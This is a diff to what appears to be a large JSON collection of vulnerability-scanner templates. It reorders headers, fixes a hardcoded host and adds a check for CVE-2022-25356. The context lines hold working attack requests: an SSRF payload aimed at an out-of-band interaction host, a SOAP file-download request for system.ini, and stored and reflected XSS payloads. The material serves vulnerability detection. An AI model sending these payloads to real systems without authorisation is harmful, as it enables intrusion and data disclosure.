@@ -10304,8 +10304,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -12249,9 +12249,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -17262,7 +17262,7 @@
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
             "GET /wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php HTTP/1.1\nHost: {{Hostname}}\n",
-            "POST /wp-admin/options.php HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\n\noption_page=iqblockcountry-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test</textarea><script>alert(document.domain)</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on\n",
+            "POST /wp-admin/options.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\noption_page=iqblockcountry-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test</textarea><script>alert(document.domain)</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on\n",
             "GET /wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
@@ -20539,6 +20539,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/admin.back<img%20src=x%20onerror=alert(document.domain)>"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-25356",
+      "info": {
+        "name": "Alt-N MDaemon Security Gateway - XML Injection",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/SecurityGateway.dll?view=login&redirect=true&9OW4L7RSDY=1"
           ]
         }
       ]
